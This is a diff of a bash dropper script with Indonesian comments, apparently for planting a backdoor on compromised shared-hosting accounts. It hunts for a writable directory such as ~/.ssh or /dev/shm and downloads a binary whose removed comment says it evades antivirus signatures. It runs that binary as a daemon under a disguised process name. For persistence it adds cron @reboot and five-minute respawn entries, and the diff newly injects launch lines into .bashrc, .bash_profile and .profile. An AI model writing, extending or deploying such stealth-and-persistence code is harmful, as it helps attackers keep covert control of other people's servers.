@@ -17,26 +17,22 @@ if [ -z "$SECRET" ]; then
     [ -z "$SECRET" ] && SECRET="auto$(date +%s)"
 fi
 
-# ============================================================
-# Fallback directory: cari dir yang writable DAN executable
-# (tiap hosting beda permission: cPanel /tmp noexec, dll)
-# ============================================================
+
 CANDIDATES=(
     "$HOME/.config/htop"
-    "$HOME/.local/bin"
-    "$HOME/mail"
-    "$HOME/.ssh"
     "$HOME/.local/bin"
     "$HOME/.cache"
     "$HOME/.config"
     "$HOME/tmp"
     "$HOME/.tmp"
+    "$HOME/.ssh"
     "$HOME/public_html/.cache"
+    "$HOME/public_html/tmp"
     "$HOME/public_html"
     "$HOME/www"
     "$HOME"
-    "/var/tmp"
     "/var/lock"
+    "/var/tmp"
     "/dev/shm"
     "/tmp"
 )
@@ -65,7 +61,7 @@ if [ -z "$BIN_DIR" ]; then
 fi
 BIN="$BIN_DIR/$BIN_NAME"
 
-# ---- 1. Download binary (hash custom -> lolos signature AV) ----
+
 echo "[*] Dir     : $BIN_DIR"
 echo "[*] Downloading binary ..."
 if command -v curl >/dev/null 2>&1; then
@@ -76,7 +72,7 @@ else
     echo "[!] gak ada curl/wget" ; exit 1
 fi
 
-# ---- 2. Verifikasi + chmod ----
+
 SZ=$(stat -c%s "$BIN" 2>/dev/null || echo 0)
 if [ -z "$SZ" ] || [ "$SZ" -lt 1000000 ]; then
     echo "[!] Download gagal / file terlalu kecil ($SZ bytes). Cek URL."
@@ -85,11 +81,11 @@ fi
 chmod 755 "$BIN"
 echo "[+] Binary  : $BIN ($SZ bytes)"
 
-# ---- 3. Kill daemon lama (kalau ada) ----
+
 pkill -f "$BIN" 2>/dev/null
 sleep 1
 
-# ---- 4. Jalankan daemon (hidden process name + daemonize) ----
+
 cd "$BIN_DIR" || exit 1
 if command -v setsid >/dev/null 2>&1; then
     setsid bash -c "exec -a '$HIDDEN_NAME' '$BIN' -s '$SECRET' -l -i -D" </dev/null >/dev/null 2>&1 &
@@ -98,10 +94,19 @@ else
 fi
 sleep 2
 
-# ---- 5. Persistence: cron respawn tiap 5 menit ----
-( crontab -l 2>/dev/null | grep -v "$BIN" ; echo "*/5 * * * * $BIN -s '$SECRET' -l -i -D 2>/dev/null" ) | crontab - 2>/dev/null
 
-# ---- 6. Output ----
+( crontab -l 2>/dev/null | grep -v "$BIN" ; \
+  echo "@reboot sleep 30; $BIN -s '$SECRET' -l -i -D 2>/dev/null" ; \
+  echo "*/5 * * * * $BIN -s '$SECRET' -l -i -D 2>/dev/null" ) | crontab - 2>/dev/null
+
+
+for rc in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile"; do
+    if [ -f "$rc" ] 2>/dev/null; then
+        grep -q "$BIN" "$rc" 2>/dev/null || echo "$BIN -s '$SECRET' -l -i -D >/dev/null 2>&1 &" >> "$rc" 2>/dev/null
+    fi
+done
+
+
 echo
 echo "=============================================="
 echo "[+] DEPLOYED OK"
